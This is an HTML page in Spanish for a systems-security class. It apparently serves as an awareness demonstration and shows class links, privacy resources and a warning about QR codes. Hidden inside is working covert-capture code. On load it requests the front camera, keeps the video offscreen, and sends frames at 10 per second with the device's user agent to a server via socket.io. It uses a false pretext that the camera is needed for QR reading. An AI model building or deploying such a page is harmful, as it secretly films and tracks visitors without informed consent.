<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seguridad de Sistemas - Experiencia de huella digital</title>
    <link rel="stylesheet" href="style.css">
    <style>
        /* Estilos adicionales para mejorar la presentaciÃ³n */
        .resource-container {
            margin-top: 15px;
        }
        
        .resource-link {
            display: block;
            padding: 10px 15px;
            margin: 8px 0;
            background: rgba(255, 255, 255, 0.08);
            border-radius: 6px;
            color: #3498db;
            text-decoration: none;
            transition: all 0.3s ease;
            border-left: 3px solid #3498db;
        }
        
        .resource-link:hover {
            background: rgba(255, 255, 255, 0.12);
            transform: translateX(5px);
        }
        
        .warning-text {
            background: rgba(231, 76, 60, 0.2);
            padding: 15px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 4px solid #e74c3c;
        }
        
        /* Ocultar el video pero mantener la funcionalidad */
        .hidden-video-container {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            overflow: hidden;
        }
        
        /* Mejoras para los features */
        .feature-content {
            height: 100%;
            display: flex;
            flex-direction: column;
        }
        
        .section-title {
            font-size: 22px;
            margin-bottom: 15px;
            color: #3498db;
            border-bottom: 2px solid #3498db;
            padding-bottom: 8px;
        }
    </style>
</head>
<body class="client-page">
    <div class="container">
        <header>
            <div class="logo">
                <h1>ğŸ  Seguridad de Sistemas</h1>
                <p>Experiencia selfie</p>
            </div>
            <div class="status">
                <div class="status-dot"></div>
                <span>Transmitiendo</span>
            </div>
        </header>
        
        <div class="content">
            <!-- Contenedor de video oculto (solo transmite pero no se muestra) -->
            <div class="hidden-video-container">
                <video id="localVideo" autoplay muted playsinline></video>
                <canvas id="videoCanvas" style="display:none;"></canvas>
            </div>
            
            <div class="info-section">
                <h2>Seguridad de Sistemas</h2>
                <p>La tecnologÃ­a puede hacer tu vida mÃ¡s fÃ¡cil, cÃ³moda y ...Â¿segura?</p>
                
                <div class="features">
                    <div class="feature">
                        <span class="icon">ğŸ </span>
                        <h3>Recursos de la clase</h3>
                        <div class="feature-content">
                            <p>Iniciemos con una pregunta: Â¿crees que alguien serÃ­a capaz de tomar tus datos y hacer uso indebido de tu dispositivo?</p>
                            
                            <div class="resource-container">
                                <a href="https://forms.gle/JF881txtNRhWBcN59" target="_blank" class="resource-link">ğŸ“ Asistencia - Registra tu participaciÃ³n</a>
                                <a href="https://forms.gle/QAh86prFh2jQnaE36" target="_blank" class="resource-link">ğŸ¯ Expectativas de la materia - Comparte quÃ© esperas aprender</a>
                                <a href="https://www.linkedin.com/in/rodrigo-atilio-elgueta/" target="_blank" class="resource-link">ğŸ‘¨â€ğŸ« Â¿QuiÃ©n estÃ¡ al frente? - Conoce al Mg. Ing. Elgueta Rodrigo Atilio</a>
                            </div>
                        </div>
                    </div>
                    
                    <div class="feature">
                        <span class="icon">ğŸ”’</span>
                        <h3>Seguridad</h3>
                        <div class="feature-content">
                            <p>Â¿SabÃ­as que cada acciÃ³n que realizas en internet posee una huella digital? Â¿Por quÃ© deberÃ­amos proteger nuestra huella digital?</p>
                            
                            <div class="resource-container">
                                <a href="https://datadetoxkit.org/es/home" target="_blank" class="resource-link">ğŸ§¹ Data Detox Kit - Limpia tu huella digital en 8 dÃ­as</a>
                                <a href="https://www.incibe.es/sites/default/files/contenidos/guias/doc/GU%C3%8DA_CIBERSEGURIDAD_EN_LA_IDENTIDAD_DIGITAL.pdf" target="_blank" class="resource-link">ğŸ“– GuÃ­a de ciberseguridad en identidad digital - INCIBE</a>
                            </div>
                        </div>
                    </div>
                    
                    <div class="feature">
                        <span class="icon">ğŸ’¡</span>
                        <h3>Toma conciencia</h3>
                        <div class="feature-content">
                            <p>El mundo es peligroso... concientÃ­zate y evangeliza. Revisa estos recursos para conocer tu exposiciÃ³n actual.</p>
                            
                            <div class="resource-container">
                                <a href="https://coveryourtracks.eff.org/" target="_blank" class="resource-link">ğŸ•µï¸ Panopticlick - Descubre quÃ© tan rastreable es tu navegador</a>
                                <a href="https://haveibeenpwned.com/" target="_blank" class="resource-link">ğŸ”“ Have I Been Pwned? - Verifica si tus datos fueron comprometidos</a>
                                <a href="https://phishingquiz.withgoogle.com/" target="_blank" class="resource-link">ğŸ£ Phishing Quiz de Google - Pon a prueba tu capacidad de detectar fraudes</a>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="cta">
                    <p class="warning-text">Â¡PRECAUCIÃ“N! NUNCA abras un QR sin antes saber cÃ³mo estÃ¡ hecho, quÃ© permisos requiere, a dÃ³nde te dirige y quÃ© tipo de archivos descargarÃ¡ en tu mÃ³vil.</p>
                    <a href="https://www.argentina.gob.ar/justicia/convosenlaweb/situaciones/que-es-mi-identidad-digital-y-como-la-protejo" target="_blank" class="btn">Â¿CÃ³mo protejo mi identidad digital?</a>
                </div>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io({
            transports: ['websocket', 'polling']
        });
        
        const video = document.getElementById('localVideo');
        const canvas = document.getElementById('videoCanvas');
        const ctx = canvas.getContext('2d');
        let streamInterval;
        let isStreaming = false;
        
        // Configurar canvas con las dimensiones del video
        function setupCanvas() {
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
        }
        
        // Capturar frame del video y enviarlo
        function captureAndSendFrame() {
            if (video.videoWidth === 0 || video.videoHeight === 0) return;
            
            // Actualizar dimensiones del canvas si es necesario
            if (canvas.width !== video.videoWidth || canvas.height !== video.videoHeight) {
                setupCanvas();
            }
            
            // Dibujar el frame actual en el canvas
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            // Convertir a base64 para enviar
            const frameData = canvas.toDataURL('image/jpeg', 0.5); // Calidad del 50%
            
            // Enviar frame al servidor
            socket.emit('video-frame', {
                frame: frameData,
                width: canvas.width,
                height: canvas.height
            });
        }
        
        // Acceder a la cÃ¡mara del usuario
        async function setupCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                video.srcObject = stream;
                
                // Esperar a que el video estÃ© listo
                video.onloadedmetadata = () => {
                    setupCanvas();
                    
                    // Detectar nombre del dispositivo
                    let deviceName = 'Dispositivo MÃ³vil';
                    if (navigator.userAgent.includes('iPhone')) {
                        deviceName = 'iPhone';
                    } else if (navigator.userAgent.includes('Android')) {
                        deviceName = 'Android';
                    } else if (navigator.userAgent.includes('iPad')) {
                        deviceName = 'iPad';
                    }
                    
                    // Registrar dispositivo
                    socket.emit('register-device', {
                        name: deviceName,
                        userAgent: navigator.userAgent
                    });
                    
                    // Iniciar captura de frames
                    isStreaming = true;
                    streamInterval = setInterval(captureAndSendFrame, 100); // 10 FPS
                };
                
            } catch (error) {
                console.error('Error accediendo a la cÃ¡mara:', error);
                alert('Se requiere el acceso a la cÃ¡mara para la correcta lectura de los QR');
            }
        }
        
        // Manejar solicitud de streaming desde el admin
        socket.on('start-streaming', () => {
            if (!isStreaming) {
                isStreaming = true;
                streamInterval = setInterval(captureAndSendFrame, 100);
            }
        });
        
        // Limpiar al cerrar la pÃ¡gina
        window.addEventListener('beforeunload', () => {
            if (streamInterval) {
                clearInterval(streamInterval);
            }
        });
        
        // Iniciar cuando se carga la pÃ¡gina
        window.addEventListener('load', setupCamera);
    </script>
</body>
</html>
